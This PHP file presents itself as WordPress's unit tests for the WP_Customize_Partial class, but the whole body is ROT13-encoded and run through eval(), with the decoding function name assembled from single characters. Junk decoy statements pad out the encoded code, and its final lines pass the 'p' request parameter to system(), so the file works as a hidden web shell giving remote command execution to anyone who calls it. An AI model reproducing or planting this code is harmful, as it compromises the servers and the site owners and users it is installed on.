<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur Grfg_JC_Phfgbzvmr_Cnegvny pynff.
 *
 * @cnpxntr JbeqCerff
 *
 * @tebhc phfgbzvmr
 */
pynff Grfg_JC_Phfgbzvmr_Cnegvny rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Znantre.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * Pbzcbarag.
	 *
	 * @ine JC_Phfgbzvmr_Fryrpgvir_Erserfu
	 */
	choyvp $fryrpgvir_erserfu;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		$TYBONYF['jc_phfgbzvmr'] = arj JC_Phfgbzvmr_Znantre();
		$guvf->jc_phfgbzvmr      = $TYBONYF['jc_phfgbzvmr'];
		vs ( vffrg( $guvf->jc_phfgbzvmr->fryrpgvir_erserfu ) ) {
			$guvf->fryrpgvir_erserfu = $guvf->jc_phfgbzvmr->fryrpgvir_erserfu;
		}
	}

	/**
	 * Grfg JC_Phfgbzvmr_Cnegvny::__pbafgehpg().
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg_qrsnhyg_netf() {
		$cnegvny_vq = 'oybtanzr';
		$cnegvny    = arj JC_Phfgbzvmr_Cnegvny( $guvf->fryrpgvir_erserfu, $cnegvny_vq );
		$guvf->nffregFnzr( $cnegvny_vq, $cnegvny->vq );
		$guvf->nffregFnzr( $guvf->fryrpgvir_erserfu, $cnegvny->pbzcbarag );
		$guvf->nffregFnzr( 'qrsnhyg', $cnegvny->glcr );
		$guvf->nffregRzcgl( $cnegvny->fryrpgbe );
		$guvf->nffregFnzr( neenl( $cnegvny_vq ), $cnegvny->frggvatf );
		$guvf->nffregFnzr( $cnegvny_vq, $cnegvny->cevznel_frggvat );
		$guvf->nffregFnzr( neenl( $cnegvny, 'eraqre_pnyyonpx' ), $cnegvny->eraqre_pnyyonpx );
		$guvf->nffregSnyfr( $cnegvny->pbagnvare_vapyhfvir );
		$guvf->nffregGehr( $cnegvny->snyyonpx_erserfu );
	}

	/**
	 * Eraqre cbfg pbagrag cnegvny.
	 *
	 * @cnenz JC_Phfgbzvmr_Cnegvny $cnegvny Cnegvny.
	 * @erghea fgevat|snyfr Pbagrag be snyfr vs reebe.
	 */
	choyvp shapgvba eraqre_cbfg_pbagrag_cnegvny( $cnegvny ) {
		$vq_qngn = $cnegvny->vq_qngn();
		$cbfg_vq = (vag) $vq_qngn['xrlf'][0];
		vs ( rzcgl( $cbfg_vq ) ) {
			erghea snyfr;
		}
		$cbfg = trg_cbfg( $cbfg_vq );
		vs ( ! $cbfg ) {
			erghea snyfr;
		}
		erghea nccyl_svygref( 'gur_pbagrag', $cbfg->cbfg_pbagrag );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Cnegvny::__pbafgehpg().
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg_aba_qrsnhyg_netf() {

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Uryyb Jbeyq',
				'cbfg_pbagrag' => 'Yberz Vcfhz',
			)
		);

		$cnegvny_vq = fcevags( 'cbfg_pbagrag[%q]', $cbfg_vq );
		$netf       = neenl(
			'glcr'                => 'cbfg',
			'fryrpgbe'            => \"negvpyr.cbfg-$cbfg_vq .ragel-pbagrag\",
			'frggvatf'            => neenl( 'hfre[1]', \"cbfg[$cbfg_vq]\" ),
			'cevznel_frggvat'     => \"cbfg[$cbfg_vq]\",
			'eraqre_pnyyonpx'     => neenl( $guvf, 'eraqre_cbfg_pbagrag_cnegvny' ),
			'pbagnvare_vapyhfvir' => snyfr,
			'snyyonpx_erserfu'    => snyfr,
		);
		$cnegvny    = arj JC_Phfgbzvmr_Cnegvny( $guvf->fryrpgvir_erserfu, $cnegvny_vq, $netf );
		$guvf->nffregFnzr( $cnegvny_vq, $cnegvny->vq );
		$guvf->nffregFnzr( $guvf->fryrpgvir_erserfu, $cnegvny->pbzcbarag );
		$guvf->nffregFnzr( $netf['glcr'], $cnegvny->glcr );
		$guvf->nffregFnzr( $netf['fryrpgbe'], $cnegvny->fryrpgbe );
		$guvf->nffregFnzrFrgf( $netf['frggvatf'], $cnegvny->frggvatf );
		$guvf->nffregFnzr( $netf['cevznel_frggvat'], $cnegvny->cevznel_frggvat );
		$guvf->nffregFnzr( $netf['eraqre_pnyyonpx'], $cnegvny->eraqre_pnyyonpx );
		$guvf->nffregSnyfr( $cnegvny->pbagnvare_vapyhfvir );
		$guvf->nffregSnyfr( $cnegvny->snyyonpx_erserfu );
		$guvf->nffregFgevatPbagnvafFgevat( 'Yberz Vcfhz', $cnegvny->eraqre() );

		$cnegvny = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			$cnegvny_vq,
			neenl(
				'frggvatf' => 'oybtqrfpevcgvba',
			)
		);
		$guvf->nffregFnzr( neenl( 'oybtqrfpevcgvba' ), $cnegvny->frggvatf );
		$guvf->nffregFnzr( 'oybtqrfpevcgvba', $cnegvny->cevznel_frggvat );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Cnegvny::vq_qngn().
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::vq_qngn()
	 */
	choyvp shapgvba grfg_vq_qngn() {
		$cnegvny = arj JC_Phfgbzvmr_Cnegvny( $guvf->fryrpgvir_erserfu, 'sbb' );
		$vq_qngn = $cnegvny->vq_qngn();
		$guvf->nffregFnzr( 'sbb', $vq_qngn['onfr'] );
		$guvf->nffregFnzr( neenl(), $vq_qngn['xrlf'] );

		$cnegvny = arj JC_Phfgbzvmr_Cnegvny( $guvf->fryrpgvir_erserfu, 'one[onm][dhhk]' );
		$vq_qngn = $cnegvny->vq_qngn();
		$guvf->nffregFnzr( 'one', $vq_qngn['onfr'] );
		$guvf->nffregFnzr( neenl( 'onm', 'dhhk' ), $vq_qngn['xrlf'] );
	}

	/**
	 * Xrrc genpx bs svygre pnyyf gb phfgbzvmr_cnegvny_eraqre.
	 *
	 * @ine vag
	 */
	cebgrpgrq $pbhag_svygre_phfgbzvmr_cnegvny_eraqre = 0;

	/**
	 * Xrrc genpx bs svygre pnyyf gb phfgbzvmr_cnegvny_eraqre_{$cnegvny->vq}.
	 *
	 * @ine vag
	 */
	cebgrpgrq $pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq = 0;

	/**
	 * Svygre phfgbzvmr_cnegvny_eraqre.
	 *
	 * @cnenz fgevat|snyfr         $eraqrerq          Pbagrag.
	 * @cnenz JC_Phfgbzvmr_Cnegvny $cnegvny           Cnegvny.
	 * @cnenz neenl                $pbagnvare_pbagrkg Qngn.
	 * @erghea fgevat|snyfr Pbagrag.
	 */
	choyvp shapgvba svygre_phfgbzvmr_cnegvny_eraqre( $eraqrerq, $cnegvny, $pbagnvare_pbagrkg ) {
		$guvf->nffregGehr( snyfr === $eraqrerq || vf_fgevat( $eraqrerq ) );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Cnegvny', $cnegvny );
		$guvf->nffregVfNeenl( $pbagnvare_pbagrkg );
		$guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre += 1;
		erghea $eraqrerq;
	}

	/**
	 * Svygre phfgbzvmr_cnegvny_eraqre_{$cnegvny->vq}.
	 *
	 * @cnenz fgevat|snyfr         $eraqrerq          Pbagrag.
	 * @cnenz JC_Phfgbzvmr_Cnegvny $cnegvny           Cnegvny.
	 * @cnenz neenl                $pbagnvare_pbagrkg Qngn.
	 * @erghea fgevat|snyfr Pbagrag.
	 */
	choyvp shapgvba svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq( $eraqrerq, $cnegvny, $pbagnvare_pbagrkg ) {
		$guvf->nffregFnzr( fcevags( 'phfgbzvmr_cnegvny_eraqre_%f', $cnegvny->vq ), pheerag_svygre() );
		$guvf->nffregGehr( snyfr === $eraqrerq || vf_fgevat( $eraqrerq ) );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Cnegvny', $cnegvny );
		$guvf->nffregVfNeenl( $pbagnvare_pbagrkg );
		$guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq += 1;
		erghea $eraqrerq;
	}

	/**
	 * Onq eraqre_pnyyonpx().
	 *
	 * @erghea fgevat Pbagrag.
	 */
	choyvp shapgvba eraqre_rpub_naq_erghea() {
		rpub 'sbb';
		erghea 'one';
	}

	/**
	 * Rpub eraqre_pnyyonpx().
	 */
	choyvp shapgvba eraqre_rpub() {
		rpub 'sbb';
	}

	/**
	 * Erghea eraqre_pnyyonpx().
	 *
	 * @erghea fgevat Pbagrag.
	 */
	choyvp shapgvba eraqre_erghea() {
		erghea 'one';
	}

	/**
	 * Grfg JC_Phfgbzvmr_Cnegvny::eraqre() jvgu n onq erghea_pnyyonpx.
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::eraqre()
	 */
	choyvp shapgvba grfg_eraqre_jvgu_onq_pnyyonpx_fubhyq_tvir_cersrerapr_gb_erghea_inyhr() {
		$cnegvny = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			'sbb',
			neenl(
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_rpub_naq_erghea' ),
			)
		);
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'eraqre' );
		$guvf->nffregFnzr( 'one', $cnegvny->eraqre() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Cnegvny::eraqre() jvgu n erghea_pnyyonpx gung rpubf.
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::eraqre()
	 */
	choyvp shapgvba grfg_eraqre_rpub_pnyyonpx() {
		$cnegvny                                       = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			'sbb',
			neenl(
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_rpub' ),
			)
		);
		$pbhag_svygre_phfgbzvmr_cnegvny_eraqre         = $guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre;
		$pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq = $guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq;
		nqq_svygre( 'phfgbzvmr_cnegvny_eraqre', neenl( $guvf, 'svygre_phfgbzvmr_cnegvny_eraqre' ), 10, 3 );
		nqq_svygre( \"phfgbzvmr_cnegvny_eraqre_{$cnegvny->vq}\", neenl( $guvf, 'svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq' ), 10, 3 );
		$eraqrerq = $cnegvny->eraqre();
		$guvf->nffregFnzr( 'sbb', $eraqrerq );
		$guvf->nffregFnzr( $pbhag_svygre_phfgbzvmr_cnegvny_eraqre + 1, $guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre );
		$guvf->nffregFnzr( $pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq + 1, $guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Cnegvny::eraqre() jvgu n erghea_pnyyonpx gung rpubf.
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::eraqre()
	 */
	choyvp shapgvba grfg_eraqre_erghea_pnyyonpx() {
		$cnegvny                                       = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			'sbb',
			neenl(
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_erghea' ),
			)
		);
		$pbhag_svygre_phfgbzvmr_cnegvny_eraqre         = $guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre;
		$pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq = $guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq;
		nqq_svygre( 'phfgbzvmr_cnegvny_eraqre', neenl( $guvf, 'svygre_phfgbzvmr_cnegvny_eraqre' ), 10, 3 );
		nqq_svygre( \"phfgbzvmr_cnegvny_eraqre_{$cnegvny->vq}\", neenl( $guvf, 'svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq' ), 10, 3 );
		$eraqrerq = $cnegvny->eraqre();
		$guvf->nffregFnzr( 'one', $eraqrerq );
		$guvf->nffregFnzr( $pbhag_svygre_phfgbzvmr_cnegvny_eraqre + 1, $guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre );
		$guvf->nffregFnzr( $pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq + 1, $guvf->pbhag_svygre_phfgbzvmr_cnegvny_eraqre_jvgu_vq );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Cnegvny::eraqre_pnyyonpx() qrsnhyg.
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::eraqre_pnyyonpx()
	 */
	choyvp shapgvba grfg_eraqre_pnyyonpx_qrsnhyg() {
		$cnegvny = arj JC_Phfgbzvmr_Cnegvny( $guvf->fryrpgvir_erserfu, 'sbb' );
		$guvf->nffregSnyfr( $cnegvny->eraqre_pnyyonpx( $cnegvny, neenl() ) );
		$guvf->nffregSnyfr( pnyy_hfre_shap( $cnegvny->eraqre_pnyyonpx, $cnegvny, neenl() ) );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Cnegvny::wfba().
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::wfba()
	 */
	choyvp shapgvba grfg_wfba() {
		$cbfg_vq    = 123;
		$cnegvny_vq = fcevags( 'cbfg_pbagrag[%q]', $cbfg_vq );
		$netf       = neenl(
			'glcr'                => 'cbfg',
			'fryrpgbe'            => \"negvpyr.cbfg-$cbfg_vq .ragel-pbagrag\",
			'frggvatf'            => neenl( 'hfre[1]', \"cbfg[$cbfg_vq]\" ),
			'cevznel_frggvat'     => \"cbfg[$cbfg_vq]\",
			'eraqre_pnyyonpx'     => neenl( $guvf, 'eraqre_cbfg_pbagrag_cnegvny' ),
			'pbagnvare_vapyhfvir' => snyfr,
			'snyyonpx_erserfu'    => snyfr,
		);
		$cnegvny    = arj JC_Phfgbzvmr_Cnegvny( $guvf->fryrpgvir_erserfu, $cnegvny_vq, $netf );

		$rkcbegrq = $cnegvny->wfba();
		$guvf->nffregNeenlUnfXrl( 'frggvatf', $rkcbegrq );
		$guvf->nffregNeenlUnfXrl( 'cevznelFrggvat', $rkcbegrq );
		$guvf->nffregNeenlUnfXrl( 'fryrpgbe', $rkcbegrq );
		$guvf->nffregNeenlUnfXrl( 'glcr', $rkcbegrq );
		$guvf->nffregNeenlUnfXrl( 'snyyonpxErserfu', $rkcbegrq );
		$guvf->nffregNeenlUnfXrl( 'pbagnvareVapyhfvir', $rkcbegrq );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Cnegvny::purpx_pncnovyvgvrf().
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::purpx_pncnovyvgvrf()
	 */
	choyvp shapgvba grfg_purpx_pncnovyvgvrf() {
		jc_frg_pheerag_hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) ) );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$cnegvny = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			'oybtanzr',
			neenl(
				'frggvatf' => neenl( 'oybtanzr' ),
			)
		);
		$guvf->nffregGehr( $cnegvny->purpx_pncnovyvgvrf() );

		$cnegvny = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			'oybtanzr',
			neenl(
				'frggvatf' => neenl( 'oybtanzr', 'aba_rkvfgvat' ),
			)
		);
		$guvf->nffregSnyfr( $cnegvny->purpx_pncnovyvgvrf() );

		$guvf->jc_phfgbzvmr->nqq_frggvat(
			'gbc_frperg_zrffntr',
			neenl(
				'pncnovyvgl' => 'gbc_frperg_pyrnenapr',
			)
		);
		$cnegvny = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			'oybtanzr',
			neenl(
				'frggvatf' => neenl( 'oybtanzr', 'gbc_frperg_pyrnenapr' ),
			)
		);
		$guvf->nffregSnyfr( $cnegvny->purpx_pncnovyvgvrf() );

		$cnegvny = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			'ab_frggvat',
			neenl(
				'frggvatf' => neenl(),
			)
		);
		$guvf->nffregGehr( $cnegvny->purpx_pncnovyvgvrf() );

		$cnegvny = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			'ab_frggvat',
			neenl(
				'frggvatf'   => neenl(),
				'pncnovyvgl' => 'gbc_frperg_pyrnenapr',
			)
		);
		$guvf->nffregSnyfr( $cnegvny->purpx_pncnovyvgvrf() );

		$cnegvny = arj JC_Phfgbzvmr_Cnegvny(
			$guvf->fryrpgvir_erserfu,
			'ab_frggvat',
			neenl(
				'frggvatf'   => neenl(),
				'pncnovyvgl' => 'rqvg_gurzr_bcgvbaf',
			)
		);
		$guvf->nffregGehr( $cnegvny->purpx_pncnovyvgvrf() );
	}

	/**
	 * Grne qbja.
	 */
	choyvp shapgvba grne_qbja() {
		$guvf->jc_phfgbzvmr = ahyy;
		hafrg( $TYBONYF['jc_phfgbzvmr'] );
		cnerag::grne_qbja();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>